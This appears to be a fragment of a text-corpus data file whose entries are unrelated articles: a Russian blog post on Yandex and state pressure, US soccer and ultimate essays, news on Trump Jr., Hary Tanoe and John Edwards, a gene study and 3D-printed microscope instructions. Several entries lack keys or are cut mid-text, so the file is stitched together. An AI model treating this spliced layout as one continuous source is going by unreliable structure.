Вычитаны человеком, у которого, увы, не было способа проверить эти утверждения самостоятельно.\n\nСмена высшего руководства Яндекса, как и обрушение его капитализации — такое же неизбежное следствие текущей госполитики в области Интернета, как и выдавливание Павла Дурова из вКонтакте, и обесценение бумаг @Mail.Ru Group. Не предвидеть, что давление на компанию будет возрастать, и что создатели Яндекса так или иначе будут отстранены от непосредственного руководства в ближайшие месяцы, мог лишь самый наивный наблюдатель.\n\nДругой вопрос, что Яндекс ведь пока не закрыли, не зафильтровали, и даже не обязали регистрироваться в качестве СМИ. И, поскольку эта компания является коммерческой, можно понять желание её топ-менеджмента (они же акционеры) сыграть на опережение, как они это уже однажды успешно сделали, когда в ответ на домогательства околовластных рэкетиров очень изящно подарили родному Государству «золотую акцию».\n\nПонятно, что с точки зрения перспектив российского Интернета, отставка Воложа — событие знаковое. Но, с точки зрения интересов самой компании, это, безусловно, попытка спасти то, что можно в такой ситуации спасти, и на какое-то время отсрочить эскалацию давления на ведущий российский портал.\n\nТут ведь важно понимать, что застрельщики кампании травли против ведущих российских интернет-бизнесов — политруки, а не эксперты отрасли. Они руководствуются лозунгами. И, по большому счёту, они сами не понимают, чего конкретно хотят, кроме отставки ярких, самостоятельных и независимых менеджеров. Если про вКонтакте они ещё могут что-то такое детское пролепетать в смысле требований — например, насчёт закрытия оппозиционных групп и выемки данных украинских пользователей, то с Яндексом задача превыше их разумения совершенно.\n\nВот, отшелестели их нелепые обвинения — сперва про поиск в блогах, потом про Яндекс.Новости — что там какие-то враги химичат с заголовками в угоду вашингтонскому обкому и ЦРУ. В ответ на эти обвинения Яндекс просто убирал рейтинги заголовков с концами, и тема для наезда закрывалась. А теперь ведь у политруков должна откуда-то взяться своя, позитивная программа: как именно манипулировать общественным мнением десятков миллионов пользователей в «правильную» сторону. И откуда ж ей взяться, если вся «манипуляция с помощью заголовков» была изначально жупелом, плодом их же воспалённого воображения? Робот Яндекса 14 лет учился различать первоисточники от ретрансляторов, склеивать новости в сюжеты, подбирать наиболее релевантный заголовок... А вот отличать «правильные новости» от «политически вредных» его никто никогда не учил. Ну нет там такой кнопки. Можно приоритизировать в выдаче государственные СМИ, назначив им высокий весовой коэффициент — но это, если верить даже данным из экспертовской статьи-доноса, само по себе благополучно случилось.\n\nлидирующих позиций лишились сайты РБК, «Ленты» и «Эха Москвы». Сегодня в топе — новостные агентства «ИТАР-ТАСС», «РИА Новости» и «Интерфакс», и это — тенденция лишь последнего полугодия, ранее эти источники имели мизерные показатели в новостной выдаче, — констатирует автор доноса, забыв уточнить, сколько миллиардов рублей на пропаганду в Интернете государство дополнительно вкачало в свой медиахолдинг за тот же период.\n\nМожно сделать вид, что не замечаешь прямой связи между ростом онлайн-присутствия госСМИ и ростом их присутствия в новостях Яндекса. Можно продолжать набрасывать, что рост связан с закулисными договорённостями, манипуляцией — не буду спорить с конспирологом на зарплате. В любом случае, всё там уже произошло, эта кнопка уже благополучно нажата. ГосСМИ выросли, независимые — потеряли долю. А где же следующая кнопка?! Как заставить робот Яндекса выдавать по любому ключевому слову (и не только в новостях) материалы только одной политической направленности? Для этого, думаю, движок Яндекса придётся переписывать с нуля. Кто этим займётся? Володин с Костиным? Матрас-партизан из Госдуры? Или, может быть, Ашманову поручат — как автору основной массы тех страшилок, по мотивам которых писались доносы на Яндекс? Ну, поручить-то, может, и поручат. Но дальше или ишак, или падишах. А Яндекс на это время получит хоть какую, но передышку.\n\nЯ не хочу гадать, как дальше будут развиваться события вокруг Яндекса. Надеюсь, в какой-то форме компании удастся сохранить свой бизнес благодаря сегодняшнему маневру с отставкой Воложа. Но логика эскалации понятна: рано или поздно комиссары поймут, что с Интернетом, даже с китайским, им в принципе не по пути. Он мешает им по той же причине, по которой он не мог бы случиться в СССР, и не работает сегодня в Северной Корее. Под контролем, или без контроля, любой Интернет (даже китайский) — это свободный обмен информацией. В конечном итоге и Яндекс, и вКонтакте им проще будет закрыть, чем пытаться эффективно контролировать, переписав движки в направлении автоматизированной политической цензуры.\n\nНо по-прежнему есть надежда, что они просто не успеют.\n\nSubscribe",

  "latent_8414": "Making The Case - Poo Poo-ing Portland’s Pong (and anyone else like him)\n\nLast night's Lamar Hunt U.S. Open Cup upset of the Portland Timbers by fifth division Cal FC will be etched in American soccer fans' memories for a long time. Indeed the third round of matches where Major League Soccer teams were introduced resulted in eight \"can you believe it?!?!\" wins by lower division sides and earned it's own Twitter hastag: #MayMadness.\n\nWhile soccer journalists and bloggers will comb over, pick apart, debate, celebrate, or fear the rise of the Eric Wynalda-led Cal FC and their run through the Open Cup, we're concerned with an incident that followed the match.\n\nThroughout the match the Timbers Army and the rest of the fans that went to JELD-WEN Field that night bemoaned the missed opportunities of their beloved Timbers. Thirty-seven shots, 15 on goal and a 79th minute missed penalty by Kris Boyd left you wondering if it just wasn't going to be their night. Five minutes into the first overtime period that feeling became a reality when Cal FC's Artur Aghasyan broke through the Timbers' defense to put home the game's lone goal.\n\nThe Timbers Army, creative as ever, voiced their displeasure.\n\n\"Care like we do.\"\n\n\"This is MLS?\"\n\n\"This is bull sh*t\".\n\n\"You deserve it.\"\n\nHonestly you can't fault the frustration of the Army. It's been a rough season for the second-year MLS outfit and sinking out of the U.S. Open Cup to an amateur side certainly doesn't take any of the sting off.\n\nAs the team was leaving the field, one fan, \"Pong\" took to demanding the players give up their jerseys. The scene was reminiscent of a recent match in Italy when \"ultras\" demanded the shirts off the backs of Genoa's players. The difference being the Portland incident being the action of one, deranged fan and not mob mentality.\n\nTimbers defender Jack Jewsbury took offense to the notion and exchanged words with Pong, only to be restrained by others.\n\nWe're not here to paint a broad brush over Portland's fans and the Timbers Army. Pong's response (and his alone) to his team's loss is downright embarrassing.\n\nThere's no doubt that Pong is a passionate fan and a committed one to the Timbers' cause. His righteous anger was probably representative of many of his fellow supporters. The team's effort, as demonstrated by the result, easily pushed him over the edge to unfortunately lash out.\n\nAs soccer fans in the United States we've taken a beating from all corners for loving this sport. Naturally we're sensitive, defensive, and sometime hostile.\n\nBut, Pong's actions Wednesday night signal a trend that we're worried about. That this game is bigger than everything else.\n\nDon't get us wrong our love for soccer is unconditional, but at the end of the day it doesn't define us. Soccer fans are men and women, young, and old, married, single, divorced. Blue-collar, white-collar. We have kids and pets and jobs and hobbies that all define us more than just the color of our jerseys and scarves.\n\n\"Blanky-blank Til I Die\"? Booing a team performance? Sounding off on blogs, talk radio, and the like? Those are perfectly acceptable sentiments and worthy ones, but we're not assholes.\n\nWe're American soccer fans. We're not England's hooligans, Italy's Ultras, or Latin America's barra bravas (despite having a similarly named supporters group in D.C.). We should pride ourselves on passion and commitment to our teams and our sport, but not to the point that it leads to outrageous actions like Pong's.\n\nAs fans we've got to be the best of what soccer has to offer and not its worst. American soccer has come too far and still has too far to go for the fan culture to slink into the gutters of what global soccer has already shown us.\n\nFor 90 minutes care about nothing but for your team then take a step back and consider what is really important.\n\nPlayers like Jewsbury and the thousands of other guys trying to make it a go in this league don't deserve this. Most of them make less that your average firefighter or cop. Reserve league guys might as well be teachers for their pay. The show up at hospitals, grocery stories, youth tournaments and bars. They're you and me with a much cooler day job.\n\nWhen they blow it we're pissed. When they win we're euphoric. Games can make and ruin days, but we move on. There's always next game and there's always next season.\n\nNo one wins \"fan of the year\" by being more \"hard\" than the others. Harassing the most opponents or rival fans. Pretending that we're all in \"Green Street Hooligans\" doesn't earn us better seats at the next game.\n\nWe've got to stop this sort of behavior before it comes to define us. It's not just Portland or Pong. It's the guy who lights the smoke bomb at the U.S. game when those get all of the American Outlaws in trouble. It's the Houston fan that launches the flashlights at the Galaxy. It's trying the LA fan trying to pick a fight with Beckham. It's the odd beer can or cup that makes its way toward a player. It's the jingo-ism, racism, sexism, or homophobia in our chants.\n\nWe're better than that. We tailgate and post-game and trade scarves with traveling fans. We shake hands with people of other nationalities when they walk into our bar for the U.S. game. We gush over players when we seem them outside the stadium. We tell them \"good game\" even when we don't really mean it.\n\nIn your team's darkest days don't you want to think that this is when you should try and hold your head the highest? That when your team needed you the most you were there to support them?\n\nWe should be decent. And should be rational. That's what American soccer fans should aspire to. It's the way we grow the game.\n\nPortland sucks, Seattle sucks, LA sucks. New York sucks, Dallas sucks, Houston sucks, Your favorite team sucks. Our team sucks. OK. Good. Heard it. Got it. Let's move on.\n\nLet's go have a beer.\n\nTags: Making The Case\n\nCheck out all the great FBM gear in our \"Swag Store\".\n\nPlease enable JavaScript to view the comments powered by Disqus.\n\nDisqus",

There is a much bigger agenda, one designed to reduce the democratic power of members in the Greens NSW.\n\nThe Greens NSW is rightly proud of the extent of its internal democracy.

He is the only main character who did not allow his name to be used in the movie, with actor Jonah Hill instead portraying someone named Peter Brand.\n\n\"I remember thinking how unforgiving it might be to have someone else portray you to the rest of the world,\" said DePodesta in a phone interview Tuesday from New York, where he is the vice president of player development and scouting for the New York Mets. \"It could be great, but it also could be very unnerving, and once I read the script and realized it was a piece of fiction, then I saw no reason for my name to be attached to it.\"\n\nHow reluctant is DePodesta? I saw the movie before he did. In fact, on Tuesday he still had not seen it, but a screening is being arranged so he doesn't have to sneak in the back of a theater and watch it with everyone else.\n\n\"I really do want to see before it opens,\" he said, laughing. \"And who knows, maybe fiction will be better for me than reality.\"\n\nParts of the movie indeed seem fictional, with the scouts being painted as evil caricatures while Beane, as played by Pitt, comes across as this overblown swashbuckling hero despite the fact that \"Moneyball\" never really worked, his teams having yet to even reach the World Series.\n\nBut Hill nails DePodesta. Hill nails his shy mannerisms, his uncomfortable silences, his awkwardness in sharing his newfangled theories with old men spitting tobacco into cups, his fear in dealing with players.\n\nAt the time of the filming Hill was a little stouter than the rail-thin DePodesta, but everything else fits, everything else I remember exactly, from the odd dress to the innovative mind to the unwavering determination in beliefs that could only be shared in darkened film rooms or back hallways.\n\n\"I saw a lot of myself in Paul in a completely different way,\" said Hill in a phone interview. \"I see a quiet rebelliousness in Paul, and I see him finding great difficulty in being defined by strangers.\"\n\nContrary to the gossip, DePodesta confirmed he had decided to remove his name from the film long before Hill became attached. DePodesta actually hung out in a group of people, including Hill, for a day before the filming, which was apparently enough for the kid to catch his vibe.",
  "latent_8671": "An Open Letter To USA Ultimate: The Focus On Visibility Is Detracting From The Player Experience\n\nThe following open letter to USA Ultimate was submitted to Ultiworld by Kevin Terry, a player for Major League Ultimate’s New York Rumble and a long-time participant in the USAU club scene.\n\nTo the USA Ultimate Board and Staff,\n\nFirst, I’d like to make a general comment about the recent changes to the Club Nationals competition format.\n\nWhile many have pointed out some of the merits of every team making the elimination bracket and reducing the number of games, this seems to have been a move to conform the structure to other sports’ showcases and is not necessarily an improvement in the quality of play or competition experience from the player perspective.\n\nPerhaps the most noteworthy aspect of an ultimate tournament is its unique test of endurance and depth. The Club Championships were an unparalleled showcase of these qualities in their prior construction. The current structure removes much of that element from the tournament.\n\nUnder the new format, teams could happily sit their 7-10 best players, lose some or all of their games in the pool play stage, and still go home National Champions. As a result, players 15-27 on the roster matter less, and the first day of competition has been rendered almost entirely meaningless.\n\nAn additional concern is that the new format, largely due to its decision to turn away from the demanding nature of power pools, means that games are spread from Thursday to Sunday, instead of the Friday to Sunday structure of prior Championships. This choice ignores an important reality: we are amateur athletes.\n\nIn order to compete at Nationals, we have to buy plane tickets, pay hotel costs, and take days off of work (or class). By changing the format of the Club Championships — and enforcing the Triple Crown structure to the regular season — USAU is demanding more from dedicated players who already give so much of their time, money, and lives to competition.\n\nDo the benefits that USAU envisions resulting from these changes outweigh the added burden on the players? I am not confident that they do.\n\n***\n\nI also want to express my concern that USAU is moving away from being a “player’s association” (its stated purpose under its title as the UPA) to an organization that is divorced from the preferences of its paying membership. This is evidenced by several moves, including the hiring of a CEO who is accountable to the board rather than members, decreasing opportunities for feedback, and now a Board of Directors nearly half of which is not elected by players.\n\nEach of USA Ultimate’s moves away from being a democratic, participant-focused structure takes me as an active, invested member farther from having an interest in the growth and well-being of the organization. The rapid changes to competition that have occurred over the last two years seem to have come without real reflection as to what costs they bring with them. Costs like the elimination of distinctive competition formats, a focus on dues-paying constituents, and a recognition that our game has evolved well without an unreasonable emphasis on external pressures, all of which have yielded excellent returns in the form of the growth of the sport.\n\nThe thought that the UPA was most interested in growing the sport, fostering its uniqueness as a form of Spirited competition, and investing in player enjoyment at all levels (by, for instance, hosting a National Championship that participants in Sarasota adored or accommodating the coexistence with well-loved community events like Potlatch) always drew me back in to full endorsement of our governing body.\n\nMy understanding of the present direction of USAU makes it seem as though those concerns are no longer at the forefront of USAU’s objectives, and I, as an individual who is somewhat representative of our sport’s average player, am quickly losing confidence that it makes sense to remain an active member. As alternative opportunities to play continue to arise, it may cease to make sense to remain a member at all.",
  "latent_8680": "<p>Biologists have been observing the “selfish” genetic entity segregation distorter (SD) in fruit flies for decades. Its story is a thriller among molecules, in which the SD gene destroys maturing sperm that have a rival chromosome. A new study reveals a tactic that gives SD’s villainy an extra edge.</p>\n\nPROVIDENCE, R.I. [Brown University] — For a bunch of inanimate chemical compounds, the nucleic and amino acids caught up in the infamous “selfish” segregation distorter (SD) saga have put on quite a soap opera for biologists since the phenomenon was discovered in fruit flies 50 years ago. A new study, a highlight in the March issue of the journal Genetics, provides the latest plot twist.\n\nIn TV listings the series would be described this way: “A gene exploits a rival gene’s excesses, sabotaging any sperm that bear a rival’s chromosome.” The listing is not an exaggeration except for ascribing malicious intent to strings of biochemicals. When male flies make their sperm, the SD gene (call it “A”) manages to rig meiosis — the specialized cell division that makes sex cells — so that maturing sperm that bear chromosomes with the susceptible allele (call that one “a”) end up defective and discarded. They never even leave the testes.\n\nIt is murder of a sort. Similar selfish systems occur in mammals, including humans.\n\nRobert Reenan “Most genes, like most people, are good upstanding citizens, but some genes want to hog all the resources.” In the Genetics study conducted at Brown University, scientists uncover new clues about how the SD gene might be gaming the system against “a.” It’s a plot so fiendish, only an aggregation of genetic bases could evolve it. It also deepens biologists’ understanding of an instance in which life violates a fundamental balance predicted by the father of genetics, Gregor Mendel.\n\n“Mendel’s first law is that different alleles of a gene will segregate,” said Robert Reeenan, professor of biology and the study’s senior author. “If we have two alleles — big A and little a — then Mendel says 50 percent of the sperm at random will get the big A and 50 percent of the sperm will get the little a. But some SD (A) alleles are so strong they pretty much kill off all the non-SD (a) chromosomes.\n\n“This is a real cheater, a real stinker,” Reenan said. “Most genes, like most people, are good upstanding citizens, but some genes want to hog all the resources, hog all the benefit.”\n\nThe SD backstory\n\nWhat makes the “a” allele susceptible to SD’s subterfuge is the number of copies it harbors of a runaway snippet of genetic code called Responder. A few copies of Responder are no problem, but hundreds of copies make “a” susceptible. Some alleles have thousands of copies and only one in a thousand survives.\n\nGenomes try to root out parasites like Responder by creating and dispatching proteins into the nucleus and the cytoplasm. These police proteins are armed with “police sketches” of the parasites in the form of small RNA transcripts.\n\nThe new plot twist\n\nIt struck Reenan and lead author Selena Gell that this policing system — because it targets self-copiers like Responder — might somehow have a role in the SD saga. They decided to find out by purposely perturbing the system.\n\nIn the experiments described in Genetics, Reenan and Gell show that engineered mutations in the police gene named Aubergine (others on the force in the experiments are called Piwi, Squash, and Zucchini) amplify SD chromosomes’ success in eliminating Responder-laden sperm, compared to that of SD chromosomes without Aubergine’s help. The results show that this police system suppresses Responder, and therefore SD. It also means that if SD somehow can upset the policing system, it can have a field day.\n\n“We’re the first to have experimentally shown that mutations in the system can modify the degree of distortion,” Reenan said. “We used homologous recombination to knock in a mutation specifically on the SD chromosome to compromise Aubergine, and that’s exactly what we saw: the chromosome became more selfish.”\n\nReenan and Gell did not go so far as to determine whether known SD-promoting genes called Enhancer of SD, Stabilizer of SD, and Modifier of SD act by interfering with Aubergine or its buddies on the force, but Reenan said that is among the next things his group will look into.\n\nIn the meantime, he reflects, it may not be entirely fair for biologists to label SD as “selfish” and not Responder as well. As an out-of-control self-repeater in the genome, Responder is surely no prize, and SD performs something of a service by taking it out when it can.\n\nThe whole story is really a clash of the selfish. “Humans, flies, all of us have been attacked for millennia by selfish genetic elements that want to make as many copies as possible,” Reenan said.\n\nSometimes, as in SD flies, there are no apparent ill effects, but when the selfish genes come in the form of viruses or other kinds of transposons, there can be trouble. So investigating the tactics of selfish genes is not merely the stuff of biological soap operas.\n\nGell, who was supported by a National Science Foundation Predoctoral Fellowship during the research, is now a postdoctoral scholar at Harvard University.",

  "latent_9065": "Donald Trump's Indonesian business partner Hary Tanoe 'may try to run for president'\n\nUpdated\n\nDonald Trump's Indonesian business partner has confirmed he wants to follow in the footsteps of his fellow billionaire and run for president.\n\n\"If there is no-one I can believe who can fix the problems of the country, I may try to run for president,\" Hary Tanoesoedibjo told the ABC.\n\n\"Not for myself, for the country,\" added the media mogul and property developer, who is always referred to as Hary Tanoe. He already has his own political party.\n\n\"We need a leader with integrity who can bring a solution for the country,\" he said.\n\nMr Tanoe's political ambitions mean there is a potential for two world leaders to also be business partners — creating a minefield of potential conflicts of interest.\n\nMr Tanoe is building two Trump projects — one in Bali and the other in the hills outside Jakarta.\n\nThe ABC has visited the Jakarta project which includes a Trump-branded hotel, 300 villas, a Trump country club and an 18-hole Ernie Els-designed golf course that will carry Trump's name.\n\nThe earthworks on the golf course have finished and planting of grass on the fairways has begun. The hotel and villa construction has not yet started, but the entire project should be finished inside Mr Trump's first term in office.\n\nThe business link with Mr Trump has given Mr Tanoe the ability to contact the incoming US president — something that plenty of world leaders struggled with.\n\n\"I have access to him of course, because we are in cooperation, but I have to limit the cooperation and interaction,\" he said.\n\nDay-to-day contact is mostly with the adult Trump children.\n\n\"The three of them. Each of them has different roles. Don junior has responsibility for the overall project, Eric the design and golf, and Ivanka more of detail — the fit-out of the hotel.\"\n\nIt is part of a billion-dollar project that will eventually include a Disneyland-style theme park.\n\nTrump to meet with controversial politicians\n\nThe Trump-Tanoe link already has the potential to create problems for Mr Trump.\n\nMr Tanoe has already arranged for two controversial Indonesian politicians to meet with Mr Trump: Setya Novanto, who was at the centre of a $US4 billion corruption scandal in Indonesia, and Fadli Zon, who is close to the Indonesian hardliners who want Jakarta's Governor Basuki Tjahaja Purnama, known by his nickname Ahok, jailed.\n\nMr Zon has met with the racist hardliner cleric Habib Rizieq, and has addressed one of the huge anti-Ahok rallies.\n\nMr Tanoe said he was not concerned about Mr Zon.\n\n\"He's a politician, so, but knowing him, he's very neutral. He's very moderate. Being a politician you have to make manoeuvers for your political position. It's very normal.\"\n\nOne of the factors holding back Mr Tanoe's political ambitions is his ethnicity — like Jakarta's Governor he is from an Indonesian Chinese background, and he is a Christian.\n\nThere is an ugly mood in Indonesia right now against both minorities.\n\nThe mood is being fuelled by Ahok's blasphemy trial.\n\nMr Tanoe is optimistic, despite the two huge anti-Ahok protests. There were an estimated half-a-million people at the second rally, on December 2.\n\n\"If the president, Jokowi, responded quickly enough we would not have seen the December 2 protest,\" said Mr Tanoe.\n\n\"The issue is more with President Jokowi. He has to show his leadership is firm enough to make people calm down.\n\n\"Indonesia is ready for whoever background for leadership [sic]. The majority of the people are more realistic. They want to see a leader who can bring solutions.\"\n\nTopics: world-politics, government-and-politics, corruption, unrest-conflict-and-war, indonesia\n\nFirst posted",

  "latent_9150": "(CNN) A scramble by White House aides to respond to the brewing controversy over Donald Trump Jr.'s meeting with a Russian lawyer may have exposed those aides to special counsel scrutiny.\n\nThey can now be called on by investigators led by Special Counsel Robert Mueller to explain what they may have learned about the meeting that the President's eldest son, Trump Jr., his son-in-law, Jared Kushner, and then-Trump campaign chairman Paul Manafort had with the Russian lawyer during the 2016 campaign.\n\nWhite House aides and Kushner's legal team began strategizing in late June over how to manage the disclosure of newly discovered emails setting up that meeting, according to sources close to Kushner's legal team.\n\nTheir public relations efforts culminated in a series of stumbles over the weekend in response to inquiries from The New York Times , which was working to publish a story about the meeting. Initial statements by Trump Jr., who organized the meeting, were undermined by more reporting from the paper.\n\nSome of the President's closest aides, who were traveling with him back from Europe, then helped strategize about a response for Trump Jr., according to people briefed on the matter. The Times first reported on the crafting of the statement.\n\nA sensitive legal matter such as this would normally have been handled by the attorneys, given that it was about the Russia investigation.\n\nBut the President's lawyer, Marc Kasowitz, who is designated to handle personal legal issues, was not traveling with the President and was largely uninvolved, according to the people familiar with the matter. The Times reported Wednesday that the President himself approved the statement, raising the possibility the President may have opened himself up to new legal issues not covered by attorney-client privilege. Jay Sekulow, the President's attorney, denied that Trump was involved.\n\n\"I wasn't involved in the statement drafting at all, nor was the President. I'm assuming that was between Mr. Donald Trump Jr., between Don Jr. and his lawyer. I'm sure his lawyer was involved, that's how you do it,\" said Sekulow in an interview on CNN's New Day.\n\nKasowitz's hiring was specifically intended to help shield White House aides from having to become witnesses in the ongoing investigation. As government employees, they aren't supposed to be involved in the President's personal matters.\n\nThe White House and lawyers for Kushner and Donald Trump Jr. did not comment for this story.\n\nMultiple changing explanations for the meeting attributed to Donald Trump Jr. made a complex set of events spiral.\n\n\"It was a public relations disaster,\" one person close to Kushner's team told CNN.\n\nNow, White House aides are pointing fingers at one another. Some of the discord is over a public relations strategy that seemed aimed in part at protecting Kushner, the only person in the June 2016 meeting who works in the White House and who already was under scrutiny for failing to disclose contacts with Russians. Donald Trump Jr., a private citizen, does not have an obligation to disclose the Russian meeting.\n\n\"Who do you have to protect? You have to protect the guy who filled out the form saying I never took this meeting,\" one of the sources said, referring to Kushner's SF-86 application for security clearance where meetings with foreigners need to be listed.\n\nPeople close to the matter said that strategy went awry because Trump Jr. released misleading press statements.\n\nJUST WATCHED Donald Trump: My son is a wonderful young man Replay More Videos ... MUST WATCH Donald Trump: My son is a wonderful young man 00:56\n\nTwo sources told CNN it was Kushner's team that discovered the emails showing Donald Trump Jr. accepted a meeting at Trump Tower with a lawyer who was presented as a Russian government lawyer able to provide damaging information about Hillary Clinton.\n\nKushner's lawyers were preparing documents to turn over to Senate Intelligence Committee investigators, and the email discovery created another problem for them.\n\nEarlier this spring, Kushner had amended his SF-86 form submitted to the FBI as part of his security clearance application. At that time, in their second revision to the original form, the Kushner lawyers listed about 100 foreign contacts. But they did not list the June 2016 meeting with the Russian lawyer.\n\nOn June 21, Kushner's lawyers provided an amended SF-86 to the FBI, their third such change, to list the meeting with the Russian lawyer. Two days later, on June 23, Kushner met with the FBI to be interviewed for his security clearance.\n\nOn June 26, CNN asked a White House spokesman assigned to Kushner about the additional meeting on the amended security clearance form, including that it was organized by Donald Trump Jr.\n\nBut Kushner's team did not respond. On June 28, Jamie Gorelick, Kushner's lawyer handling the issue, sent a letter to the FBI to complain about what she believed was an improper leak, according to a person close to the matter.\n\nThe Kushner team also discussed whether they should immediately go public and disclose the meeting and the emails, given the press inquiry, according to a person close to Kushner. This person said Kushner knew of the newly discovered email by mid-June and told his lawyers he planned to sit down with the President to discuss the meeting and the email that had been discovered.\n\nIt's not clear what Kushner told the President. Trump told reporters Wednesday on Air Force One that he was not told the meeting was about obtaining dirt on Hillary Clinton.\n\nThe White House and Sekulow have said the President wasn't aware of the contents of the email until recent days, just before the Times published its stories beginning on Saturday.\n\nThe initial statement provided to the Times, and attributed to Donald Trump Jr., said the June 2016 meeting was about adoptions.\n\nEven inside the White House and among other people involved in the process, there was discomfort because they knew the emails existed and they thought the statement was misleading.\n\nThe Times quickly followed up with a story showing that the Donald Trump Jr. knew the meeting was about negative information on Clinton.\n\nEventually, Trump Jr. published the emails himself, beating the Times to the punch after being notified by the paper that it was preparing to publish the emails.",

  "latent_9768": "One early evening in February 2006, John Edwards, the former North Carolina senator then gearing up to launch his second presidential campaign, was hanging out in the bar of the Regency Hotel on Park Avenue with one of his donors and his young traveling aide, Josh Brumberger. A woman sitting at a nearby table with some friends walked over and introduced herself.\n\nMy friends insist you’re John Edwards, Rielle Hunter said. I tell them no wayyou’re way too handsome.\n\nAdapted from Game Change: Obama and the Clintons, McCain and Palin, and the Race of a Lifetime, by John Heilemann and Mark Halperin.\n\nCopyright © 2010 by the authors. Reprinted by permission of Harper, an imprint of HarperCollins Publishers.\n\nNo, ma’am. I’m John Edwards, the candidate replied.\n\nNo way! I don’t believe you!\n\nBrumberger saw this kind of thing all the time. Women were always hitting on his boss. He and Edwards had a well-oiled system in place for dealing with these situations tactfully and politely.\n\nHe is John Edwards, Brumberger interjected, and I’m sorry, but we’re in the middle of something. Thank you.\n\nOh, I’m sorry, Hunter said, and retreated to her table.\n\nBrumberger thought that she was trouble from the get-go. She looked like a hybrid of Stevie Nicks and Lucinda Williams, in an outfit more suitable for a Grateful Dead concert than an evening at the Regency. A few minutes later, after Edwards departed for a dinner around the corner, Hunter came back over to Brumberger and started quizzing him about his job. I think I can help you guys, she said, and handed him her business card. The inscription read, BEING IS FREE: RIELLE HUNTERTRUTH SEEKER.\n\nAfter Hunter left, Brumberger sat there chuckling, having another glass of wine with one of his colleagues from Team Edwards. A little while later, he looked up through the window and clocked Hunter and one of her friends cornering his boss on his way back from dinner. Holy shit, that crazy lady just cut him off! Brumberger yelped and sprinted outside, where he broke up the scene, leading Edwards back into the hotel.\n\nThank you, Edwards said, apparently relieved. I’m lucky you saw that, because those women, I don’t think they would have quit.\n\nLooking back on it later, Brumberger would always wonder about that evening: Was Hunter’s presence really an accident? Had she and Edwards met before? Did she slink back into the hotel and spend the night with him? The questions would plague him, and with good reasonfor that night at the Regency was the moment when Edwards’s cataclysmic implosion began.\n\nFor all the tabloid headlines that have dogged Edwards in the years since then, most of the details of the circumstances that led to his fall have remained shrouded in mystery. After his turn as John Kerry’s running mate in 2004, Edwards was among a small handful of politicians with a credible shot at occupying the Oval Office. He was popular and charming, with serious rhetorical skills, a wife beloved by the public, and the same basic profilea white, southern, moderate maleas the previous three Democrats who’d proved capable of winning the White House. Today, according to a recent NBC NewsWall Street Journal poll, Edwards stands as the most disappointing public figure of 2009, having collected twice as many votes for that dubious distinction as Tiger Woods. And hard as it is to imagine, the coming months may debase his image further still.\n\nPhilandering is hardly a novel vice among presidential wannabesor presidents, for that matter. Nor was the Edwards campaign the only national operation in 2008 for which the actual or rumored extracurricular activities of the candidate (or the candidate’s spouse) posed a significant political problem. John McCain’s campaign expended vast amounts of time and energy dealing with accusations that the senator had had an affair with a lobbyist and preparing to confront stories that his wife was carrying on a liaison of her own. Hillary Clinton’s team established a war room within a war room to douse potential flare-ups in the press surrounding her husband’s personal life. Indeed, among the top-tier contenders, only the eventual Mr. and Mrs. 44 were untroubled by such matters.\n\nYet it was Edwards who stepped so far across the line that his career and life were reduced to rubble. For all the high drama of the Obama-Clinton battle and the historic import of the former’s general-election victory over McCain, Edwards’s story is equally, lastingly resonant: an archetypal political tragedy in which the very same qualities that fuel any presidential bidego, hubris, vanity, neediness, a kind of delusionbecame all-consuming and self-destructive. And in which the gap between public façade and private reality simply grew too vast to bridge.\n\nUnlike Hillary Clinton and Barack Obama, both of whom wrestled for months with the question of whether to run in 2008, Edwards indulged in no to-ing or fro-ing. Before the dust had even settled on 2004, he was planning for four years hence. On the day he and Kerry conceded defeat, Edwards discovered that Elizabeth had breast cancer; a few days after that, he was on the phone with his pollster and close friend Harrison Hickman, gaming out the campaign ahead.",

Download the files at the bottom of this page to print your own microscope.\n\nThe microscope slips over the camera lens of the cell phone and is no thicker than a phone case. It’s designed to fit most cell phone brands, including iPhone 4 and 5, Galaxy S3 and S4 phones and iPads. The material cost, not including the printer, is under $1.\n\nThe PNNL team has made a 350x version, which is adequate to identify parasites in blood samples or protozoa in drinking water. A 100x version enables children to investigate common items like salt grains and flower petals in much greater detail.\n\nUsing glass spheres as a microscope lens is not a new idea, optically, but the small size of the housing combined with very high magnification and extremely low cost is what makes this device practical.\n\nLow cost was a driver in the research and development project targeting a specific Department of Homeland Security need for rapid bio detection technologies. The microscope needed to be so cheap it could literally be thrown away, in case it gets contaminated.\n\n\"We feel there are many uses out there including human and veterinary medicine in developing countries,\" said Janine Hutchison a microbiologist at PNNL. \"We are also really excited about engaging kids in science. School districts have a hard time providing enough microscopes for students. Our science education staff is getting it into the hands of local school children this fall through the auspices of the Mid-Columbia STEM Education Collaboratory.\"\n\nTroubleshooting Tips\n\nStart with the 100x version if possible. Learning and getting familiar with the system using the lowest magnification possible will increase the usefulness with the higher magnification versions. The higher magnification versions are more sensitive to alignment and take more time and practice to produce good images.\n\nThe lens must be pushed into the plastic housing until the front of the lens is flush with the housing. If the camera is having trouble focusing on an object, double check the lens placement to make sure the lens is fully seated in the plastic.\n\nIf the image has blurry or dark spots that never change no matter what you are imaging, it could be from a dirty lens or defects in the lens. Try to clean the lens using water or rubbing alcohol and a soft cloth or tissue. If this doesn’t help, and if the image is degraded too much due to these defects, pop out the lens and replace it with a new one.\n\nLens Specifications\n\nThe bead sizes below correspond to the 3D printer files for each magnification. Each printer will have a unique level of shrinkage that will slightly impact the hole diameter where the bead sits. Printing a few prototypes on your printer, or increasing the hole size carefully with a small drill bit or needle after the fact can help adjust for the shrinkage if the hole was printed too small.\n\nThe 100x version requires a bead with a 3mm diameter\n\nAll 350x versions require a bead with approximately 1mm diameter\n\nPlease note the inexpensive beads come in a variety of qualities.

  "latent_10144": "by\n\nIn a recent column on Pope Francis’ latest encyclical, Laudato Si, the conservative New York Times columnist Ross Douthat says that “After this document, there’s no doubting where Francis stands in the great argument of our time….But,” Douthat elaborates, “I don’t mean the argument between liberalism and conservatism. I mean the argument between dynamists and catastrophists.” Here’s how Douthat understands that “great argument”:\n\n“Dynamists are people who see 21st-century modernity as a basically successful civilization advancing toward a future that’s better than the past. They do not deny that problems exist, but they believe we can innovate our way through them while staying on an ever-richer, ever-more-liberated course….Dynamists of the left tend to put their faith in technocratic government; dynamists of the right, in the genius of free markets. But both assume that modernity is a success story whose best days are ahead.” “Catastrophists, on the other hand, see a global civilization that for all its achievements is becoming more atomized and balkanized, more morally bankrupt, more environmentally despoiled. What’s more, they believe that things cannot go on as they are: That the trajectory we’re on will end in crisis, disaster, dégringolade…that current arrangements are foredoomed, and that only a true 